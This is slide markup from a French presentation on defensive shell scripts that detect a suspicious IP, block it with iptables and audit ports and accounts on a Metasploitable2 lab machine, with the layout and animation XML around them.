                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="51" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="309"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="52" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="53" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="311"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="54" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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 grpId="0"/>
      <p:bldP spid="297" grpId="0"/>
      <p:bldP spid="298" grpId="0"/>
      <p:bldP spid="299" grpId="0" animBg="1"/>
      <p:bldP spid="301" grpId="0"/>
      <p:bldP spid="302" grpId="0"/>
      <p:bldP spid="303" grpId="0"/>
      <p:bldP spid="304" grpId="0" animBg="1"/>
      <p:bldP spid="306" grpId="0"/>
      <p:bldP spid="307" grpId="0"/>
      <p:bldP spid="308" grpId="0"/>
      <p:bldP spid="309" grpId="0" animBg="1"/>
      <p:bldP spid="3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9" name="Google Shape;239;p14"/>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lvl="0">
              <a:buClr>
                <a:srgbClr val="0E9E5E"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>VALIDATION — SCRIPTS D'AUTOMATISATION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="240" name="Google Shape;240;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="1005840" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E11D4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14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="100584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DÉFI</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="242" name="Google Shape;242;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691640" y="1371600"/>
            <a:ext cx="48463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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>grep -P non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>supporté</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> : Ubuntu 8.04 (2008) trop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ancien</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="246" name="Google Shape;246;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1750060"/>
            <a:ext cx="1280160" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E9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14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1750060"/>
            <a:ext cx="128016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SOLUTION</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="248" name="Google Shape;248;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1920240" y="1750060"/>
            <a:ext cx="48463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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>grep -oE ... | awk — expression régulière étendue standard</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="260" name="Google Shape;260;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2200000"/>
            <a:ext cx="3498240" cy="320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u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>detect_attack.sh</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="261" name="Google Shape;261;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2520000"/>
            <a:ext cx="3498240" cy="430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100" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Signale une IP suspecte, sans agir</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="262" name="Google Shape;262;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3000000"/>
            <a:ext cx="3498240" cy="3460000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="16A34A"/>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buNone/>
            </a:pPr>
            <a:endParaRPr sz="1000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="263" name="Google Shape;263;p14"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="678640" y="4292182"/>
            <a:ext cx="3238240" cy="595634"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="264" name="Google Shape;264;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="678640" y="5900000"/>
            <a:ext cx="3238240" cy="280000"/>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None/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" i="1" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>IP suspecte détectée avec succès</a:t>
            </a:r>
            <a:endParaRPr sz="1000" i="1">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="265" name="Google Shape;265;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4346880" y="2200000"/>
            <a:ext cx="3498240" cy="320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u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>react_block.sh</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="266" name="Google Shape;266;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4346880" y="2520000"/>
            <a:ext cx="3498240" cy="430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100" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Détecte puis bloque automatiquement via iptables</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="267" name="Google Shape;267;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4346880" y="3000000"/>
            <a:ext cx="3498240" cy="3460000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="16A34A"/>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buNone/>
            </a:pPr>
            <a:endParaRPr sz="1000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="268" name="Google Shape;268;p14"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4476880" y="4304766"/>
            <a:ext cx="3238240" cy="570467"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="269" name="Google Shape;269;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4476880" y="5900000"/>
            <a:ext cx="3238240" cy="280000"/>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None/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" i="1" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Blocage automatique de l’IP (185 tentatives)</a:t>
            </a:r>
            <a:endParaRPr sz="1000" i="1">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="270" name="Google Shape;270;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8145120" y="2200000"/>
            <a:ext cx="3498240" cy="320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u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>audit.sh</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="1">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="271" name="Google Shape;271;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8145120" y="2520000"/>
            <a:ext cx="3498240" cy="430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100" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Inventaire des ports, comptes et permissions sensibles</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="272" name="Google Shape;272;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8145120" y="3000000"/>
            <a:ext cx="3498240" cy="3460000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="19050" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="16A34A"/>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buNone/>
            </a:pPr>
            <a:endParaRPr sz="1000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="273" name="Google Shape;273;p14"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275120" y="3953386"/>
            <a:ext cx="3238240" cy="1273226"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="274" name="Google Shape;274;p14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8275120" y="5900000"/>
            <a:ext cx="3238240" cy="280000"/>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None/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" i="1" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Liste des ports en écoute sur Metasploitable2</a:t>
            </a:r>
            <a:endParaRPr sz="1000" i="1">
              <a:solidFill>
                <a:srgbClr val="5B6B7F"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="256" name="Google Shape;256;p14"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>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fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24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2"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24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1"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24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7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="16" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24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8"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="24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0"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26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1"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26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5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26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6"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="26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0"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="34" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="27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1"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="271"/>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262"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="262"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="43" presetID="6" presetClass="entr" presetSubtype="16" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="263"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="45" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="263"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="46" presetID="6" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="264"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="48" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="264"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="49" presetID="6" presetClass="entr" presetSubtype="16" fill="hold" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="50" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="268"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="circle(in)">
                                      <p:cBhvr>
                                        <p:cTn id="51" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="268"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="52" presetID="6" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="53" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
